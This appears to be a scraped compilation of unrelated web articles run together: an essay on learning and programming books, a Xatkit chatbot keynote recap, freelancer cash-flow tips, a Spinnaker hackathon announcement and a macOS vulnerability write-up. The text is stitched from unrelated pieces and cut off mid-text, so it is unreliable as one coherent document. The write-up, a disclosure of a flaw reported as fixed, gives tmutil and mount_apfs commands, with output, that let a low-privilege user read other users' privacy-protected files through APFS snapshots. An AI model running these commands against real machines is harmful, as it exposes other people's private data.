they are prone to simply accept random pieces of “knowledge” that they found on some random
blog as facts and rules to live by. These bits of knowledge are then accumulated
and moving forward through osmosis, until it gets to the point
where people believe into voodoo computer operations that are somehow
inaccessible to the mere mortals.</p><h2 id="how-expensive-is-knowledge">How expensive is knowledge?</h2><p>If you live in a relatively well organized society, then the knowledge is
actually free or at least priced at the point which you could consider as free.</p><p>Formal education in my country is “free”. It’s not quite free as we pay for
it with a relatively high taxes, but it’s free
in a way where anyone could be attending any school regardless of their income or
social status. All of the university lectures are also public and free to attend
by anyone from the streets. That usually doesn’t happen, but it’s still an option
for someone that is willing to listen and learn something new.</p><p>Despite spending more than 15 years in school, I didn’t really learn much there.
It’s one thing learning about the internals of this specific thing that you are
interested in, whereas abstract learning about general stuff was not
that interesting for me. I was introduced to a few new concepts and
I learned a great deal of math which I never used later on,
but that was pretty much it [2]. It was as if my brain was made out of Teflon and
whatever they threw at it didn’t stick. Oh, well…</p><p>The main problem that I see with the modern formal education is in that they
are trying to compact the ever growing knowledge into chunks that you
should memorize and repeat when asked, which keeps you busy so your
parents are able to work. They treat your brain as a hard drive
for dumping facts, while in reality it is a self-programmable high performance
CPU with infinite potential that is preserving data rather poorly.
In case you are wondering, this wordy description means that your brain
is far far away from the dumping ground of facts, but it excels at making
abstract connections and general never seen before type of problem solving.</p><p>As Richard Hamming put it in his excellent
<a href="https://blog.royalsloth.eu/articles/you-and-your-research/">You and Your Research</a> talk:</p><blockquote><p>But I am inclined to believe that, in the long-haul, books which leave out
what’s not essential are more important than books which tell you everything
because you don’t want to know everything. I don’t want to know that much
about penguins is the usual reply. You just want to know the essence.</p><p>Richard Hamming</p></blockquote><p>Learning facts and dates when somebody discovered something is not that useful
in a world where all this knowledge is 1 click away.
It’s good for those occasions when you have to mingle and impress the
audience at your gala table, but other than that it’s mostly taking away your
brain space that could be used for solving more important problems than mere
memorization. The amount of knowledge absolutely exploded in the past
100 years and you cannot possibly cram all that junk into that
tiny brain compartment.</p><p>Of course, this statement will enrage the people from the land of the free
who spent thousands on their education, while at the same time most of the
things are better explained elsewhere. I had a pretty good math teacher, but
you can find thousand times better lectures on the internet made by strangers
who are educating others from the goodness of their heart, such as
<a href="https://www.3blue1brown.com/">3blue1brown</a>. And best of all, they are free.</p><h2 id="where-does-the-knowledge-come-from">Where does the knowledge come from?</h2><p>Most of the things that I’ve accumulated over the years came from this mildly
amusing idea that we call the internet. I had English classes in school,
but I actually learned English while playing online games and mindlessly
browsing internet. Nowadays I am mostly communicating in English, despite
not being a native speaker. Who knew that wasting time on the internet would
be so useful one day? I most certainly did not.</p><p>But, where did you learn about computer stuff?</p><ul><li><p>I learned how to program via shitty online tutorials and building useless
websites. Building a crappy website with just your mind and a text editor
was a mind blowing experience.</p></li><li><p>I learned how to manage Linux servers by tinkering with an old crappy
laptop and endlessly broken Linux system. Also I pushed those useless
websites there and played with the system until the website appeared
in the browser.</p></li><li><p>I learned the rest by reading books on a particular topic that interested
me and later on talking to my coworkers.</p></li></ul><p>The actual knowledge came from spending thousands of hours
in front of a computer just trying things out and playing with
already discovered concepts. I may as well formulate this insight as:</p><div><pre><code data-lang="text">great work = spoon fed knowledge + experience + magic sauce</code></pre></div><p>The parameters of this equation are also listed in a chronological order, as
they appear throughout the life:</p><ol><li><p><strong>Spoon fed knowledge</strong>: obtained through formal education, reading books, online
tutorials and picking brains of experienced people.</p></li><li><p><strong>Experience</strong>: given enough spoon fed knowledge and plenty of hours, that
knowledge is turned into experience. Suddenly you are mildly aware of what
works and what doesn’t based on the past scars.</p></li><li><p><strong>Magic sauce</strong>: a mix that consists of your own thoughts, experience and
inspiration that brewed over the years. You might as well fit this into the
realm of creativity.</p></li></ol><p>You are free to throw some insanity into the mix to make it pop.</p><h2 id="which-book-should-i-read-next">Which book should I read next?</h2><p>Writing this question into your search engine of choice will provide hundreds
of thousands results for the list of top 10 books on “X” that will
help your career and change your perspective forever.
All of those lists are accompanied with a
tiny note telling you that the author is associated with a “$LARGE_BOOK_STORE” and buying them
through their links will somehow help them run their blog in order to publish
more of those useful lists.</p><p>I checked my library of dead tree items and found 15 technical books which
I bought and read multiple times over the past few years. Most of them were pretty good
and they were extremely valuable for my career. Reading a deep dive into the
topic you are interested in is a great investment and you should definitely read
as much as possible.</p><p>Still, I can’t really suggest you to read any of those books that I bought.
They were all a great investment up to some point.
Then one day you reach the level when you realize that the knowledge from those
books only apply up to a certain point, and sticking to whatever the book authors
have to say is actually a bad idea for your specific case.</p><p>Sometimes you even realize that what the book authors are preaching is
actually harmful and is in fact hurting the entire industry by poisoning the bright
minds with false ideas. Like the advice from a well known person B. “Sell Books” M.
that is preaching how the comments are harmful and a big code smell.</p><p>The advice is totally fine and yes, you should most definitely structure your program in a way where
the code is self explanatory. Then one day you happen to work on one of
those multi million lines long codebase where people kept this advice close to
their hearts. After a few years the original developers are long gone and nobody knows how the damn thing works and why
a certain architectural decisions were made. Nothing makes sense and the documentation
does not reflect the current state, but the code sure is clean with none of those smelly little comments.</p><p>The zealots will argue how people misunderstood the book and that it only
pushed people towards improving the structure of the program as opposed to writing
lengthy comments. The result was naturally the exact opposite. People are
hesitant to write comments because writing comments has become this big bad wolf
and you should be afraid of the big bad wolf.</p><p>The best code that I have ever written to this date contains a lot of comments.
In fact ~30% of that particular codebase consists of comments. The feedback that
I got from the current maintainers was mostly on how easy it
is to jump into it and update the business logic, because all the unknowns
and possible future pitfalls …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
					<p>As part of the <a href="http://botse.org/" target="_blank" rel="noopener noreferrer">2nd International Workshop on Bots in Software Engineering</a> (BotSE 2020), I gave the keynote <a href="https://www.slideshare.net/jcabot/lessons-learned-from-building-a-commercial-bot-development-platform" target="_blank" rel="noopener noreferrer">“Lessons learned from building a commercial bot development platform”</a> where I discussed some of the key aspects we have learned while building our opensource and <a href="https://modeling-languages.com/low-code-platforms-smart-apps-ai/" target="_blank" rel="noopener noreferrer">low-code</a> chatbot development platform <a href="https://xatkit.com/" target="_blank" rel="noopener noreferrer">Xatkit</a>&nbsp; (see also the <a href="https://github.com/xatkit-bot-platform" target="_blank" rel="noopener noreferrer">Xatkit organization in GitHub</a>)</p>
<p>After an introductory <a href="https://xatkit.com/chatbot-videos-presentations-xatkit/" target="_blank" rel="noopener noreferrer">mini-tutorial on Xatkit</a> and explaining why the world needs yet another bot solution, I moved to discuss the struggles we are facing when trying to move Xatkit from a research prototype to a commercial-grade tool. Some of the challenges are common to any<a href="https://jordicabot.com/industrialization-of-research-tools-the-atl-case/" target="_blank" rel="noopener noreferrer"> industrialization effort</a> (when you’re at the same time the research team and the technology provider in charge of maturing the tool) and shared as well with any other core open source project fighting for its <a href="https://sustainoss.org/" target="_blank" rel="noopener noreferrer">long-term sustainability</a> (a topic on which, btw, <a href="https://livablesoftware.com/bots-open-source-sustainability/" target="_blank" rel="noopener noreferrer">bots can also play a key role</a>).</p>
<p>You can check the slides of my talk below but let me also highlight some of our key lessons learned in building a chatbot platform for you, ranging from organizational, technical, and business challenges:</p>
<ul>
<li><strong>Organizational challenges</strong>
<ul>
<li><strong>You need to be a Polymath to create a bot platform</strong>. Plenty of core bot tech: NLU, Sentiment Analysis, Xtext, Slack/GH/… APIs,…., but even more non-bot tech: InfluxDB, Nginx, eCharts, React, web sockets, Docker… that you’ll need to master when building a bot platform.</li>
<li>Commercial-grade quality involves<strong> spending more and more time on “boring” tasks</strong> as you need to polish all aspects of the tool (interface, docs,…) that you can easily skip when just building a prototype.</li>
<li><strong>Common challenges to any OSS project</strong> like attracting contributors, giving support to <a href="https://livablesoftware.com/5-ways-to-thank-open-source-maintainers/" target="_blank" rel="noopener noreferrer">users that don’t even say thank you</a> or the cost of maintaining external contributions (e.g. connectors) especially when the core is still evolving</li>
<li><strong>Being pragmatic.</strong> Make sure everything you do has a good Return of Investment. Example: we went from having official releases, to core releases to no releases (compile from sources). Also, we don’t support older versions and don’t keep backward compatibility. These are all things that would be nice to have but that we cannot afford.</li>
</ul>
</li>
<li><strong>Technical challenges</strong>
<ul>
<li><strong>Eat your own chatbot food</strong> for a better language. Evolving your DSLs is expensive, try to design a variety of bots to make sure your language is expressive enough for your needs (e.g. when we moved to our current <a href="https://xatkit.com/chatbot-dsl-state-machines-xatkit-language/" target="_blank" rel="noopener noreferrer">state-machine language semantics</a>, we had to reimplement the editor, the examples, the docs,…</li>
<li><strong>Combine textual and graphical notations</strong>. Textual for writing + <a href="https://xatkit.com/graphical-rendering-of-your-chatbot-models/" target="_blank" rel="noopener noreferrer">Graphical for Reading</a></li>
<li>Do not reinvent the wheel. <strong>We came close to reinvent Java!</strong> (and moved to <a href="https://www.eclipse.org/Xtext/documentation/305_xbase.html#xbase-language-ref-introduction" target="_blank" rel="noopener noreferrer">Xbase</a>)</li>
<li>Think long-term. <strong>Research prototypes are pure technical debt</strong></li>
<li>Security. <strong>Are you protected against DDoS attacks via a bot?. </strong>It’s not only a security concern but also an economical one if you’re paying to an external provider (e.g. DialogFlow) to process your input texts. There are also privacy concerns if you keep the session data for further <a href="https://xatkit.com/dashboard-monitoring-chatbot/" target="_blank" rel="noopener noreferrer">bot monitoring and analysis</a>.</li>
</ul>
</li>
<li><strong>Natural Language Processing</strong>
<ul>
<li>NLP engines don’t speak Catalan. Once you’re out of the mainstream languages (English, Spanish, French,….) you may need to combine several NLP engines to cover well the languages you’re interested in.</li>
<li><strong>NLP engines are not bilingual. </strong>In some countries, bots should be able to combine different languages <strong>in the same conversation</strong></li>
<li><strong>Everybody seems interested in having sex with a bot.</strong> Trolls are also a huge problem with bots. As a brand you don’t want to risk going viral because your bot gave the wrong response to a Troll question.</li>
<li><strong>Reusable intent libraries</strong>. You don’t want to define again <em>Greetings</em>, <em>Thank You</em> or <em>Troll</em> intents.</li>
<li><strong>Testing chatbots is a largely unexplored area</strong> • <a href="https://xatkit.com/testing-chatbots-with-botium-and-xatkit/" target="_blank" rel="noopener noreferrer">We use Botium to record conversation</a>s to be used as test cases but need much more (e.g. automatic generation of test cases)</li>
<li><strong>More training sentences are not always better.</strong> Overall quality may decrease if they start overlapping with sentences for other intents.</li>
</ul>
</li>
<li><strong>Business</strong>
<ul>
<li><strong>Most end-users do not want to define chatbots.</strong> It doesn’t matter how nice is your interface. They just want to give you their data and get a bot from you.</li>
<li><strong>Find your niche. </strong>There are over a hundred bot solutions out there. Choose wisely your domain (e.g. <a href="https://xatkit.com/free-chatbot-wordpress-plugin/" target="_blank" rel="noopener noreferrer">our WordPress plugin</a>) and your business model. E.g. Consider Selling a service (such as our consulting and <a href="https://xatkit.com/digital-assistant-services/" target="_blank" rel="noopener noreferrer">managed chatbot hosting services</a>) and not a tool.</li>
<li><strong>Understand what really matters to your future clients</strong>. You’ll be surprised. For instance, making sure the color of your chatbot widget perfectly matches the look and feel of their website may be more important to them that your latest cool AI-based feature.</li>
<li><strong>Help your clients understand what their visitors want to use the bot for. </strong>You think you know what your visitors will want to use the bot for but in reality, you don’t. So having a dashboard to monitor the conversations the bot doesn’t know how to answer is vital.</li>
<li><strong>Self-learning bots</strong>. Your clients will want that but it’s risky. You don’t want the bot to learn the wrong things.</li>
</ul>
</li>
</ul>
<p>At the end of the talk I also emphasized why we belive you should consider using Xatkit</p>
<ul>
<li>As <strong>a bot teaching platform. </strong>If you teach any course involving bots, chatbots, NLP or DSLs / software modeling and are looking for a use-case or a ready-to-use bot platform for experimentation we’ll be happy to help with materials and assistance and even (remote) seminars</li>
<li>As <strong>a bot research platform</strong>. In many bot-related research, researchers spend a significant amount of time putting together the bot pieces they need to create their bots and/or run their experiments. We ask you not to reinvent the wheel and, instead, <strong>adopt Xatkit as base platform.</strong> You’ll benefit from all Xatkit features and connectors to have powerful bots with less effort and will be able to spend more time on the core research aspects</li>
</ul>


<p>Of course, mine was just one of the many interesting talks that took place in the workshop. In the <a href="http://botse.org/" target="_blank" rel="noopener noreferrer">BotSE</a> website, you have the full program and links to the videos and slides of all presentations (e.g. don’t miss the great <a href="https://probot.github.io/" target="_blank" rel="noopener noreferrer">Probot</a> talk by <a href="https://dev.to/gr2m/" target="_blank" rel="noopener noreferrer">Gregor Martynus</a>).

<h2>Why do freelancers have cash flow concerns that employees do not?</h2>



<p>It’s superficial and shortsighted to say it’s because employees get a paycheck every other week. Employees simply work for corporations, which are certainly not immune to cash flow problems. Things happen — missed payroll, delaying reimbursements, and layoffs — just to name a few that impact employee wallets / purses directly.</p>



<p>Even so, businesses with large quantities of employees do tend to be better at insulating their employees from cash flow problems in the business than freelancers are about insulating themselves from cash flow issues in their practices. Organizations of any substantial size are able to “roll with the punches” a bit more.</p>



<h2>Why?</h2>



<p>It seems big business has an advantage, but it’s only because they’ve engineered things that way. Alas, they do not have magical cash flow sources that I can reveal to you. What they do have is something close though: high-impact, proven strategies for improving the cash flow in any business situation.</p>



<p>Specifically, for increasing the likelihood that, at any given point in time, they’ll be able to cover the bills, pay employees, and keep in progress projects moving forward.</p>



<p>What a typical corporation has is options and flexibility. Even solo/small technical service businesses can have these things, but it has to be engineered just like it does for the big companies.</p>



<p>Let’s break down what a typical corporation has in its “cash flow toolbox.” Then let’s figure out exactly how we can replicate these in our own situation. Even a solo IT consultant can learn from this. I know because I am one and I have.</p>



<h2>How cash flow is engineered in a typical corporation</h2>



<p>Much of the flexibility in a bigger business comes from things that any organization of any reasonable size is expected to have. As smaller businesses — especially in my experience with solo IT freelancers, consultants, and service businesses — we often don’t think about these things. Or, more accurately, we don’t know how to make them happen. After all, we don’t have a professional and experienced Chief Financial Officer (CFO) who is dedicated to living and breathing cash flow and balance sheet data. At least I’ve never considered myself one …and I am the de facto CFO for my own business.</p>



<h2>Some of the cash flow “levers” in a typical corporation</h2>



<p>Here are some engineered cash flow levers available to a typical corporation. We need to identify them so that we can figure out equivalents for our own business activities.</p>



<p>It’s not necessary, by any means, that we have equivalents in our own business for every single one of these levers. It’s only necessary that we have some, and possibly add to them over time as our own business activities mature and our risks and needs change.</p>



<ul><li>Customer/client diversity (e.g. individual customer/client, different regions, etc.)</li><li>Product/service diversity (e.g. multiple offerings appealing to different customers under different conditions)</li><li>Capacity to borrow funds (e.g. lines of credit, bank loans, payable notes sold to investors)</li><li>Capacity to raise money (e.g. equity sold to investors)</li><li>Tangible assets to move around and/or sell (e.g. cash, physical assets, real estate,&nbsp;subsidiaries, etc.)</li><li>Intangible assets to sell or license out (such as trademarks/patents, intellectual property, distribution rights, etc.)</li><li>Dedicated as well as excess capacity – brains, energy, labor, manufacturing, or distribution capacity (e.g. dedicated management and staff with ideas, energy, and time to focus and tackle problems and opportunities as they come up)</li><li>Planning and forecasting — tools, people, data to do it</li><li>Budgeting — tools, people, and data to do it</li><li>Ability to defer expenditures (e.g. maintenance, new capital expenditures, freezing of new hiring, delaying planned and in-progress &nbsp;projects, etc.)</li><li>Ability to delay payment — to vendors, contractors (!), and government</li><li>Boosting marketing investments — in areas proven to have the highest (or the shortest, depending on which is more important) return on investment (while reducing investments in lower ROI, albeit still profitable, areas)</li><li>Boosting sales efforts — just like marketing, focusing resources on&nbsp;areas proven to have the highest (or the shortest, depending on which is more important) return on investment (while reducing investments in lower, albeit still profitable, ROI areas)</li><li>Creating limited time price incentives (e.g. for customers to buy now, for customers who pay earlier than typical, or for customers who buy in larger quantities than they normally would)</li><li>Requiring payment before shipping product</li><li>Requiring a set-up fee before delivering a new service</li><li>A willingness to make investments for the long-term</li></ul>



<p>These are just a few of the biggies.&nbsp;</p>



<h2>Engineering your own freelancing business for maximum cash flow flexibility</h2>



<p>What lessons can be learned from what a typical large corporation does that can then be translated into things in your own consulting practice? Quite a few it turns out!</p>



<p>Here are some ideas:</p>



<ul><li>Diversify your client base<ul><li>In quantity (e.g. if you have two clients, get three)</li><li>By industry (e.g. if all of your clients are in one industry, get one from another industry)</li><li>In revenue percentage (e.g. if one client accounts for &gt;50% of your annual income, get another one)</li><li>By region (you get the picture)</li><li>By size (e.g. small business, large business)</li><li>By type (e.g. for-profit, non-profit, government)</li></ul></li><li>Diversify your engagements&nbsp;<ul><li>Lots of project work? Balance these out with more retainers.</li><li>Lots of retainers? Balance these out with some project work.</li><li>Lots of new clients? Increase the repeat business you get from past/existing clients.</li><li>Few new clients? Improve how you generate leads for new potential clients.</li></ul></li><li>When cash flow is good (or, at the very least, you have some cash in the bank), establish a credit line associated with your business that you can draw upon when needed</li><li>Use your good personal credit history to establish one or two business only credit cards<ul><li>Use these to pay bills/overhead and pay them back promptly, building up your credit profile for increased access to credit in the future</li></ul></li><li>Look at your expenses/overhead<ul><li>Trim unnecessary subscriptions (including for software/services) expenses, even if you think you may want them later (you can always resubscribe later on if you don’t find alternatives in the mean time)</li><li>Give some thought during the good times to what expenses are most discretionary in case adjustments need to be made quickly</li></ul></li><li>Invoice your clients sooner and more often — don’t wait until the first. Switch to billing every other week or even every week. Bill immediately upon project completion as well.</li><li>Require a portion of project fees be paid up front<ul><li>50% of the estimated total fee, if hourly</li><li>50% of the total fee, if using fixed or value-based fees</li></ul></li><li>Offer a 10% discount for full payment, upfront, of the total fee</li><li>Package up your services, expertise, or access to you in new ways then encourage clients to buy them by making it worth their while (e.g. buying hours in bulk, buying special access to you via email or phone, etc.)</li><li>Defer investments not related to creating new revenue within &lt;x&gt; days<ul><li>Where &lt;x&gt; is a criteria you set depending on how much of a crunch you are in</li></ul></li><li>No matter what, keep investing in your main client acquisition approach or you will put yourself in an even worse cash flow situation (e.g. in my practice I have one monthly activity that entails investing in a monthly mailing of a specific type to my house mailing list every single month; at most I skip one or two months per year)</li><li>Re-focus resources constantly<ul><li>Limit cash/credit use to investments in direct revenue generating activities, less on overhead and unnecessary things</li><li>Defer planned projects that aren’t in the top 1/2/3 (or whatever) in terms of near-term cash flow generators</li></ul></li><li>Look for low-risk, low-investment, high-potential opportunities to boost revenue – e.g. smart marketing arrangements such as joint ventures with complimentary businesses to do an endorsement to their own customer/client bases of your services with a special offer</li><li>Manage your working capital / keep some cash in the bank</li></ul>



<p>That’s just a start to get your brain used to the idea of thinking this way. Go back and look at the corporate list and brainstorm ways to adapt versions of the corporate approaches to your solo practice.</p>



<p>Let me know what you are doing to increase your cash flow, whether it’s on the above idea list or not.</p>



<p>Regards,<br>-jr</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                
                <p>A hub of the SDLC, Spinnaker offers the world’s most advanced collection of enterprise-tested software delivery abstractions. The vitality and resilience of that collection comes down to Spinnaker’s open source core, which codifies the automation that Netflix developed for its feature-rich, highly available entertainment platform. Because of transparent open source governance and culture, we can trace Spinnaker’s trajectory from a uniquely adapted solution for Netflix’s use case, to a secure, cloud agnostic, hyper-extensible platform capable of abstracting the unique software development and delivery lifecycles of diverse enterprises across the banking, retail, technology, and multimedia industries.</p>
<p>We can also stay connected to the contributors who have made Spinnaker’s evolution possible as they grow career expertise and <a href="https://youtu.be/Mj1i_yqmrLM">leverage it to deliver results</a>. Armory invests in this network of DevOps, DevSecOps, and reliability practitioners; we take an active role in Spinnaker’s governance via the TOC, and by co-chairing SIGs and creating opportunities for the community to connect, share, and contribute. Open source is about being better together through shared motivation, and that principle inspired <a href="https://spinnaker.io/community/gardening/">Spinnaker Gardening Days</a>.</p>
<h2>Spinnaker Gardening Days, vision to reality</h2>
<p>After an exciting <a href="https://blog.spinnaker.io/building-open-source-community-culture-online-part-1-2f77272f5442">first Gardening event</a> in April, Armory is excited to present an extended version of this virtual open source hackathon July 16 – 23, 2020. We’re inviting all who are getting started with, operating, or perennially contributing to Spinnaker to gather and <strong>automate the SDLC </strong>with us. New challenges, team matching support, and a week-long hack period will make this event even more impactful than the first.</p>
<p>Spinnaker Gardening Days gives DevOps engineers, SREs, cloud architects, and all involved in the software lifecycle the chance to get involved in the project. As the global open source community around Spinnaker grows, companies like AWS, Salesforce, and Pulumi have joined to help build a thriving ecosystem. For the July hackathon, AWS has generously sponsored compute for participants so that those without a development-friendly Spinnaker environment can still hack.</p>
<p>This spring, Salesforce had planned to host the first Gardening Days live at its San Francisco headquarters, in a hybrid in-person and virtual format. As we pivoted the event to a virtual one, Salesforce worked with Armory to provide registrants with lunch vouchers and incredible prize perks to motivate them despite the distance and global disruption. We weren’t sure what to expect, but a Pulumi plugin for Spinnaker was one of the most exciting projects to come out of April’s Gardening Days.</p>

<p>Pulumi, a multicloud infrastructure-as-code tool that allows users to define infrastructure in any language as they build modern apps, was aware of Spinnaker and heard about Gardening Days a week before it took place. They put a team together and decided to leverage Spinnaker’s <a href="https://blog.spinnaker.io/cant-go-outside-dip-your-toes-in-the-spinnaker-plugins-pool-1076f74003b">plugin framework</a> to build an integration between their open source project and ours. This opportunity to deliver value to shared stakeholders without maintaining modifications to the core project represents Spinnaker’s vision for plugins, and as a bonus, is a perfect nerd-out opportunity for delivery engineers. So, naturally, Armory engineers joined the Pulumi team to support and validate the nascent framework while helping to envision a new SDLC collaboration.</p>
<p>You can read more about how to use the new Pulumi plugin for Spinnaker to run Pulumi apps in the <a href="https://www.pulumi.com/docs/guides/continuous-delivery/spinnaker/">Pulumi Docs</a>. If you like using the plugin, please share your story with us by posting in the <a href="https://spinnakerteam.slack.com/archives/CV4A90DPF">#gardening-general</a> channel on <a href="https://join.spinnaker.io/">Spinnaker Slack</a>! Pulumi’s Dan Hernandez and Praneet Loke joined us recently for <a href="https://www.youtube.com/playlist?list=PL4yLrwUObNkvO80Bjln8_DJXxQNSYrtEs">Spinnaker.Live</a>, a virtual Spinnaker conference in June that drew 800 attendees from the delivery community to share Spinnaker success stories, discuss problems and innovations in the SDLC, and learn new ways to solve with Spinnaker. Their talk tells the story of Armory &amp; Pulumi’s collaboration, and demos the functionality of the Pulumi plugin to build infrastructure within Spinnaker pipelines.</p>
<h2>Gardening Days V2: Spotlight on Security &amp; Ops, backed by AWS</h2>
<p>Indeed, as the enterprise Spinnaker experts, Armory engineers and architects know more than most about the challenges of using Spinnaker at scale to safely fuel business results via better software. At the July Gardening Days, they will again join fellow SIG-members and friends from Netflix, Google, and AWS as “experts” to guide hackathon participants in projects through mentorship and on-call help. In addition, to help attendees best leverage the sponsored AWS compute, a team of Armory engineers led by Fernando Freire will offer a hands-on first time contributor course on July 16th. This class will guide attendees through making a first contribution using EKS with Kubectl to develop against a Spinnaker instance in the cloud, and will provision an environment for them to use for contributions all week.</p>
<p>Another way Spinnaker Gardening Days will evolve in July is with a stronger focus on enabling collaboration with Security and Ops experts in the SDLC. Luckily, Spinnaker’s Special Interest Groups (SIGs) have already taken this on with a variety of projects. Both the <a href="https://github.com/spinnaker/governance/tree/master/sig-security">Security SIG</a> and the <a href="https://github.com/spinnaker/governance/tree/master/sig-ops">Ops SIG</a> will host their next meetings on July 16th, the first day of Spinnaker Gardening, and each will use the meeting to form a hackathon team as part of the SIG challenge. The Security SIG is in the midst of announcing their new CVE tracking and scoring process for managing reported CVEs that impact Spinnaker. As part of this process, they must develop threat models for each of Spinnaker’s common deployment endpoints – sounds like a fun hackathon project! This innovation around Spinnaker CVEs represents an important step in giving security-minded professionals what they need to collaborate in delivery pipelines as we “shift left” for more secure software products.</p>
<p>On the Ops SIG, we hear a lot of buzz about improving dynamic account loading, a key process in scaling Spinnaker usage. The Ops SIG hopes to build something like a pipeline stage that Spinnaker operators can use to add accounts, and will form a team on the 16th, too. Both the Ops and Security SIGs invite you to join them and bring your problems, frustrations, and ideas in scaling, hardening, and operating Spinnaker. Since n<span>o two software delivery life cycles are alike, exchanging fresh perspectives and best practices raises the bar for everyone. When it comes to security, SIG co-chair Beth Fuller highlights the value of sharing expertise that may not have been considered if everyone involved in a discussion had the same background and experience. She’s hoping DevSecOps professionals will <a href="http://go.armory.io/gardening">register for Gardening Days</a> to earn prizes and recognition for sharing that expertise.</span></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <h2 id="tldr">TL;DR</h2>
<p>We could mount the entire file system through APFS snapshots as read-only, with the <code>noowners</code> flag, which enables us accessing (almost) every file in the file system, including data (documents, files, etc…) of every user on the system, including those protected by Apple’s privacy framework (TCC). Even with the Guest account we could read files of admin accounts as Guest! 😱</p>
<p>This could be achieved with a single command, for example:
<code>mount_apfs -o noowners -s http://com.apple.TimeMachine.2019-11-17-141812.local /System/Volumes/Data /tmp/snap</code></p>
<p>This has been fixed in macOS Catalina 10.15.4 and on Mojave on the 26th of May.</p>
<h2 id="the-issues">The Issues</h2>
<p>There were two separate issues in this bug, and the combination of those became a very powerful system wide access.</p>
<ol>
<li>TCC privacy is not enforced on mounted local snapshots allowing someone to mount it and access any file inside, including those normally privacy protected</li>
<li>Initiating an APFS snapshot is available for all users, even low privileged ones, as well as listing of those. Beyond that, all users can mount local APFS snapshots, even a low privilege ones, and if used with the <code>noowners</code> flag, the low privilege user can access all data through the local snapshot, including every other users’ data (even high privileged one).</li>
</ol>
<h2 id="1-privacy-bypass">1. Privacy bypass</h2>
<p>From Terminal we can get a list of local snapshots available:</p>
<pre><code>% tmutil listlocalsnapshots /System/Volumes/Data
Snapshots for volume group containing disk /System/Volumes/Data:
com.apple.TimeMachine.2019-11-15-202744.local
com.apple.TimeMachine.2019-11-16-135116.local
com.apple.TimeMachine.2019-11-16-145028.local
com.apple.TimeMachine.2019-11-16-162241.local
com.apple.TimeMachine.2019-11-16-182353.local
com.apple.TimeMachine.2019-11-16-214156.local
com.apple.TimeMachine.2019-11-17-112126.local
com.apple.TimeMachine.2019-11-17-122313.local
</code></pre><p>We can mount one:</p>
<pre><code>csaby@mac ~ % /sbin/mount_apfs -o nobrowse,ro -s com.apple.TimeMachine.2019-11-16-182353.local /System/Volumes/Data /tmp/snap
</code></pre><p>If we navigate the user’s folder, we will be able access locations which our protected by TCC.</p>
<pre><code>csaby@mac ~ % ls -l /tmp/snap/Users/csaby/Library/Messages 
total 6224

-rw-r———r———   1 csaby  staff  1520312 Nov 16 08:09 prewarm.db-wal
</code></pre><p>if we compare it with standard access, it is not permitted:</p>
<pre><code>csaby@mac ~ % ls -l /Users/csaby/Library/Messages
ls: Messages: Operation not permitted
</code></pre><p>This is an issue as we can access every file through the local snapshot mountpoint.</p>
<p>We can also force the creation of a snapshot if there is no one:</p>
<pre><code>csaby@mac ~ % tmutil localsnapshot
Created local snapshot with date: 2019-11-17-140728
</code></pre><p>In short with <code>mount_apfs</code> we can completely bypass privacy protected folders.</p>
<h2 id="2--privilege-escalation">2.  “Privilege escalation”</h2>
<p>Although this method is not a full privilege escalation, as we don’t get higher privileges, however we can access files that belong to higher privilege users, and with the previous finding, this will include TCC protected data.</p>
<p>First, as a low privilege user we can create a local snapshot, and later list it to get its ID (this is not a bug). Although the second is not a hard requirement, as its ID can be figured out based on the time. Also snapshots are auto created by the system, so even if we can’t create one we can find one, and its ID is guessable, because it uses the following format: <code>yyyy-mm-dd-hhmmss</code>.</p>
<p>Here follows the demonstration of the issue. This is the low privileged ID I used:</p>
<pre><code>% id                       
uid=502(n00b) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),100(_lpoperator),702(com.apple.sharepoint.group.2),701(com.apple.sharepoint.group.1)
</code></pre><p>To show that it doesn’t have access to other user’s folder (where by-the-way, <code>csaby</code> is an admin user):</p>
<pre><code>n00b@mac Messages % ls -l /Users/csaby/Library 
ls: Library: Permission denied
</code></pre><p>Let’s create and list local snapshots:</p>
<pre><code>n00b@mac Messages % tmutil localsnapshot
Created local snapshot with date: 2019-11-17-141812

% tmutil listlocalsnapshots /
Snapshots for volume group containing disk /:
com.apple.TimeMachine.2019-11-17-133110.local
com.apple.TimeMachine.2019-11-17-133316.local
com.apple.TimeMachine.2019-11-17-141812.local
</code></pre><p>We can mount the snapshot with <code>noowners</code>, which according to the <code>manpage</code> means:</p>
<blockquote>
<p>Ignore the ownership field for the entire volume.  This causes all objects to appear as owned by user ID 99 and group ID 99.  User ID 99 is interpreted as the current effective user ID, while group ID 99 is used directly and translates to `unknown’.</p>
</blockquote>
<pre><code>n00b@mac Messages % mount_apfs -o noowners -s com.apple.TimeMachine.2019-11-17-141812.local /System/Volumes/Data /tmp/snap
mount_apfs: snapshot implicitly mounted readonly
</code></pre><p>And finally we can access all data from there as the privileges set for our user:</p>
<pre><code>% cd /tmp/snap/Users/csaby 
n00b@mac csaby % ls -l Library/Messages 
total 4704
-rw-r--r--  1 n00b  staff   258048 Nov  9 14:41 chat.db
-rw-r--r--  1 n00b  staff    32768 Nov 17 13:29 chat.db-shm
-rw-r--r--  1 n00b  staff  1507952 Nov  9 14:41 chat.db-wal
</code></pre><p>We can perform this attack even as a <code>Guest</code> account if FileVault is not turned ON. If FileVault is ON, Guest can only run Safari (after a reboot), and also the user data will be encrypted, so even if someone can break out the kiosk mode and start <code>Terminal</code> and run the above commands, he/she wouldn’t see the contents.</p>
<h2 id="the-fix-">The “Fix” 😭</h2>
<p>This requires some longer explanation as IMO the fix provided by Apple is not right.</p>
<p>At the beginning of March 2020, Apple said that the fix is shipped in Catalina 10.15.4 beta, they didn’t tell a word how they fixed it. I quickly jumped on it, and I found that the trick still works. I was puzzled. After some testing it turned out that they tied this to the Full Disk Access (FDA) right in TCC (<code>kTCCServiceSystemPolicyAllfiles</code>), which I found wrong. This is what I wrote them on the 13th of March:</p>
<blockquote>
<p>I did one more test and turned off “Full Disk Access” for Terminal, and then it indeed stopped working. I don’t consider this as a fix, relaying on TCC stopping this is a bad move in my opinion, most people will have Terminal set to “Full Disk Access”.</p>
